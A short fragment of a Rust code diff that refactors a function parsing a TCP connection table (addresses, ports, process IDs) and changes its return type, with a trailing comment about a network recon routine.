-        let lport_raw = read_u32_le(&buf, off + 8).unwrap_or(0);
-        let raddr = read_u32_le(&buf, off + 12).unwrap_or(0);
-        let rport_raw = read_u32_le(&buf, off + 16).unwrap_or(0);
-        let pid = read_u32_le(&buf, off + 20).unwrap_or(0);
+        let state = read_u32_le(buf, off).unwrap_or(0);
+        let laddr = read_u32_le(buf, off + 4).unwrap_or(0);
+        let lport_raw = read_u32_le(buf, off + 8).unwrap_or(0);
+        let raddr = read_u32_le(buf, off + 12).unwrap_or(0);
+        let rport_raw = read_u32_le(buf, off + 16).unwrap_or(0);
+        let pid = read_u32_le(buf, off + 20).unwrap_or(0);
         // Ports stored network-order in the low 16 bits.
         let lport = ((lport_raw & 0xFFFF) as u16).swap_bytes();
         let rport = ((rport_raw & 0xFFFF) as u16).swap_bytes();
@@ -939,7 +1094,7 @@ fn net_connections() -> Response {
         push_str(&mut out, b"\n");
         i += 1;
     }
-    Response::Output(out)
+    out
 }
 
 /// Network recon. Routes the `query` exactly like agent-dev `do_net`, but the
